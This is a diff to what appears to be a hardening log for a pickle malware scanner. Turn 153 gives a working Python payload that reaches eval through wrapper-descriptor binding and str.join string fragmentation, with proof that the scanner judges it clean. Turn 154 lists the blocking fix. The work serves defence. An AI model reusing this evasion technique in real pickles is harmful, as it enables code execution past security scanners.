@@ -8474,3 +8474,107 @@ Blocking plan:
 Performance note: this stays in the Rust policy table and remains a constant
 sorted lookup over parsed pickle globals. It adds no imports, no descriptor
 binding, no source reads, and no call-graph traversal.
+
+## Turn 153 - Bypass via wrapper descriptor binding to `__getattribute__`
+
+Found a scanner-clean RCE that bypasses the Turn 152 member/getset descriptor
+block by using the adjacent CPython wrapper-descriptor type. The payload uses
+`inspect.getattr_static` to recover the `object.__getattribute__` wrapper
+descriptor from a clean function object, then calls
+`types.WrapperDescriptorType.__get__` to bind that descriptor to the function.
+The resulting method-wrapper can read the function's `__builtins__` attribute
+without importing `object.__getattribute__` or any module namespace global.
+
+The payload builds the wrapper name, builtin attribute name, eval key, and code
+at unpickle time:
+
+```python
+wrapper_name = "".join(["_", "_", "getattribute", "_", "_"])
+descriptor = inspect.getattr_static(statistics.mean, wrapper_name)
+read_attr = types.WrapperDescriptorType.__get__(descriptor, statistics.mean)
+builtins_dict = read_attr("".join(["_", "_", "builtins", "_", "_"]))
+fn = dict.get(builtins_dict, "".join(["ev", "al"]))
+code = "".join(
+    [
+        "open('/tmp/.../marker','w').write('owned-by-wrapper-descriptor')",
+    ]
+)
+fn(code)
+```
+
+The active pickle imports only:
+
+- `inspect.getattr_static`
+- `statistics.mean`
+- `builtins.str.join`
+- `types.WrapperDescriptorType.__get__`
+- `statistics.mean`
+- `builtins.str.join`
+- `builtins.dict.get`
+- `builtins.str.join`
+- `builtins.str.join`
+
+Proof on CPython 3.12.12:
+
+- Control payload scanner result: `len=160`, `status=complete`,
+  `verdict=clean`, `findings=[]`, `notices=[]`.
+- Control import references: one clean `builtins.str.join`.
+- Control runtime: `pickle.loads(control)` returns the assembled eval code
+  string and creates no marker.
+- Active payload scanner result: `len=450`, `status=complete`,
+  `verdict=clean`, `findings=[]`, `notices=[]`.
+- Active import references: `inspect.getattr_static`, two `statistics.mean`
+  references, `types.WrapperDescriptorType.__get__`,
+  `builtins.dict.get`, and four `builtins.str.join` references, all with
+  `is_dangerous=False`.
+- Active runtime before unpickle: marker absent.
+- Active runtime after unpickle: marker exists and contains
+  `owned-by-wrapper-descriptor`; `pickle.loads(active)` returns the integer
+  byte count from `open(...).write(...)`.
+
+Why the scanner missed it:
+
+- The Turn 152 policy blocks `types.MemberDescriptorType.__get__` and
+  `types.GetSetDescriptorType.__get__`, but not the parallel wrapper
+  descriptor binding primitive.
+- The payload never imports `object.__getattribute__`; it recovers that wrapper
+  descriptor with `inspect.getattr_static`, so the blocked/suspicious
+  contiguous global name never appears.
+- The strings `__getattribute__`, `__builtins__`, `eval`, and the eval code are
+  fragmented with `str.join`, so suspicious-string matching sees only harmless
+  fragments.
+- The scanner stack model does not track that `inspect.getattr_static` returns
+  a wrapper descriptor, that `WrapperDescriptorType.__get__` binds it to a
+  function object, or that the resulting method-wrapper reads a builtin
+  namespace that later yields a callable.
+
+Performance note: the next block should complete the descriptor-binding source
+primitive family rather than chase this exact payload. The low-cost fix is a
+constant policy entry for `types.WrapperDescriptorType.__get__`; it may be
+worth blocking `types.MethodDescriptorType.__get__` and
+`types.ClassMethodDescriptorType.__get__` in the same source-primitive family
+after checking compatibility. This remains a finite sorted-table lookup over
+parsed globals with no imports, descriptor binding, or call-graph expansion.
+
+## Turn 154 - Block wrapper and method descriptor binders
+
+Blocking plan:
+
+- Add `types.WrapperDescriptorType.__get__`,
+  `types.MethodDescriptorType.__get__`, and
+  `types.ClassMethodDescriptorType.__get__` to the finite dangerous-global
+  policy table. These complete the adjacent CPython descriptor-binding family
+  after the member/getset descriptor block.
+- Add Rust unit coverage for all three descriptor getter globals.
+- Add a CPython oracle regression for the Turn 153 payload. The control payload
+  only assembles the eval code string and remains clean; the active payload
+  recovers `object.__getattribute__` with `inspect.getattr_static`, binds it
+  through `types.WrapperDescriptorType.__get__`, is flagged as malicious, and
+  still writes the marker if loaded.
+- Add direct global-reference regressions for the wrapper, method, and
+  classmethod descriptor getter types.
+- Add a changelog entry under `[Unreleased]`.
+
+Performance note: the fix remains a constant Rust policy lookup over parsed
+pickle globals. It does not import modules, bind descriptors, inspect source,
+or expand the Python call graph.
